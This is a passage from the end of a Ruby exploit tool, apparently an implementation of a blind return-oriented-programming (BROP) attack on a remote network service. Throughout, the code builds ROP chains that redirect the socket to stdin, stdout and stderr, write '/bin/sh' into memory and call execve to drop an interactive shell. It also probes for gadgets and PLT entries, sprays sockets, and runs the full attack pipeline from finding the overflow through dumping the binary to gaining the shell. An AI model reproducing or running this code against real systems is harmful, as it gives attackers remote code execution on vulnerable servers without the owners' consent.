	plt += @pltf[name] * 0x10

#	print("PLT For #{name} is #{plt.to_s(16)}\n")

	return plt
end

def exploit_small()
	rax     = @gadgets['rax']
	rdx     = @gadgets['rdx']
	rsi     = @gadgets['rsi']
	syscall = @gadgets['syscall']

	close = get_plt_addr("close")
	dup   = get_plt_addr("dup")
	sleep = get_plt_addr("sleep")
	read  = get_plt_addr("read")
	write = get_plt_addr("write")

	# 0. reset
	try_rop_print(0x666, [DEATH])

	s = make_connection()

	sl = 10

	#
	# 1. dup socket to stdin, stdout, stderr
	#
	for i in 0..2 do
		rop = []

		rop << @rdi
		rop << i
		rop << close

		rop << @rdi
		rop << @fd
		rop << dup

		rop << @rdi
		rop << sl
		rop << sleep

		slave = try_rop_print(i, rop, true)
	end

	#
	# 2. kill socket so app doesn't know about it
	#
	rop = []

	rop << @rdi
	rop << @fd
	rop << close

	rop << @rdi
	rop << sl
	rop << sleep

	#
	# 3. write /bin/sh to memory
	#
	slave = try_rop_print(0x55, rop, true)

	writable = @got_end + 100
	print("\nWritable 0x#{writable.to_s(16)}\n")

	binsh = "///////bin/sh\0"

	rop = []
	rop << @rdi
	rop << 0

	rop << rsi
	rop << writable

	rop << rdx
	rop << binsh.length

	rop << read

	rop << @rdi
	rop << sl
	rop << sleep

	slave = try_rop_print(0x69, rop, true)

	sleep(1)
	s.write(binsh)
	sleep(1)

	#
	# 4. echo /bin/sh back for debug
	#

	rop = []
	rop << @rdi
	rop << 0

	rop << rsi
	rop << writable

	rop << rdx
	rop << binsh.length

	rop << write

	rop << @rdi
	rop << sl
	rop << sleep

	slave = try_rop_print(0x70, rop, true)

	stuff = s.recv(1024)
	print("Got #{stuff.length}\n")

	idx = stuff.rindex("/bin/sh")
	abort("damn") if idx == nil
	print("idx #{idx}\n")

	writable += idx

	rop = []
	rop << @rdi
	rop << writable

	rop << rsi
	rop << 0

	rop << rdx
	rop << 0

	rop << rax
	rop << 59 # execve

	rop << syscall

	slave = try_rop_print(0x71, rop, true)
	sleep(1)

	print("\n")

	dropshell(s)
end

def exploit()
	return exploit_small() if @small

	fd   = @fd
	need = @fd_max - @fd_min - 1

	if need <= 0
		return if try_exploit(need, fd)
		need = 1
		print("Will try to sock spray\n")
	end

	# XXX
	if need > 0
		need = 50
		fd = 20
	end

	return if try_exploit(need, fd)

	abort("can't dude... it sucks\n")
end

def try_exploit(need, fd)
	rop = build_exp_rop(true, fd)

	abort("Can't exp") if not rop

	print("ROP chain #{rop.length} #{rop.length * 8} bytes\n")

	conns = []

	need.times do
		conns << make_connection()
	end

	print("Made connections\n")

	s = try_rop_print(0x666, rop, true)
	conns << s

	print("\nMade #{conns.length} connections\n")

	binsh = "/bin/sh\0"

	sleep(1)

	print("Writing /bin/sh\n")

	for s in conns
		s.write(binsh)
	end

	s = find_sock(conns)
	if s == false
		print("Can't find sock\n")
		return false
	end

	stuff = s.recv(1024)
	if stuff.index(binsh) == 0
		print("Read /bin/sh\n")
	else
		abort("dammmm")
	end

	dropshell(s)

	return true
end

def check_inf(inf)
	abort("wtf") if try_rop_print(inf, [DEATH]) != RC_CRASH

	tests = []
	tests << [inf]
	tests << [inf, DEATH]
	tests << [@plt, inf]
	tests << [(@plt + 6), inf]
	tests << [@plt, (@plt + 6), inf]
	
	# brop gadget probe
	rop = []
	rop << @plt
	6.times do
		rop << @plt
	end
	rop << inf
	rop << inf
	rop << DEATH
	tests << rop

	rop = []
	4.times do
		rop << (@plt + 6)
		rop << @plt
	end
	rop << inf
	tests << rop

	rop = []
	4.times do
		rop << @plt
		rop << (@plt + 6)
	end
	rop << inf
	tests << rop

	for t in tests
		rc = try_rop_print(inf, t)

		if rc != RC_INF
#			print("Failed test #{tests.index(t)}\n")
			return false
		end
	end

	abort("wtf2") if try_rop_print(inf, [DEATH]) != RC_CRASH

	return true
end

def test_vsyscall(rdi = nil, arg = nil)
	time = VSYSCALL + 0x400
	inf  = @inf

	rop = []

	if rdi
		rop << rdi
		rop << arg
	else
		arg = time
	end

	rop << time
	rop << inf
	rop << inf
	rop << DEATH

	return try_rop_print(arg, rop)
end

def find_good_inf()
	addr = @plt

	print("Finding good INF\n")

	off = 0

	while true
		off += 0x10

		addr = @plt + off
		break if check_inf(addr)

		addr = @plt - off
		break if check_inf(addr)
	end

	@inf = addr
	print("\nINF at 0x#{@inf.to_s(16)}\n")
end

def set_timeout()
	s = Time.now

	r = try_exp("A" * 1024)

	abort("cmon dude") if r != RC_CRASH

	diff = Time.now - s
	diff *= 4
	diff = 0.1 if diff < 0.1

	@to = diff
	print("Setting timeout to #{@to}\n")
end

def do_pwn()
	load_state()

	set_timeout() if @to == 1
	do_step(method(:find_overflow_len)) if not @olen
	do_step(method(:find_rip)) if not @rip
	do_step(method(:find_inf)) if not @inf
	do_step(method(:find_plt)) if not @plt
	do_step(method(:find_depth)) if not @depth
	do_step(method(:find_gadget)) if not @rdi
	do_step(method(:find_strcmp)) if not @strcmp
	do_step(method(:find_write)) if not @write
	do_step(method(:find_fd)) if not @fd
	do_step(method(:find_good_rdx)) if @strcmp_len < STRCMP_WANT \
					   or not @strcmp_zero
	do_step(method(:find_rdx)) if not have_small_write()
	do_step(method(:dump_bin)) if not can_exploit()
	do_step(method(:exploit))
end

def pwn()
	begin
		do_pwn()
	rescue Interrupt => e
		print("\n")
		print_progress()
	end
end

end # Class Braille

def main()
	b = Braille.new
	b.pwn()
end

main()
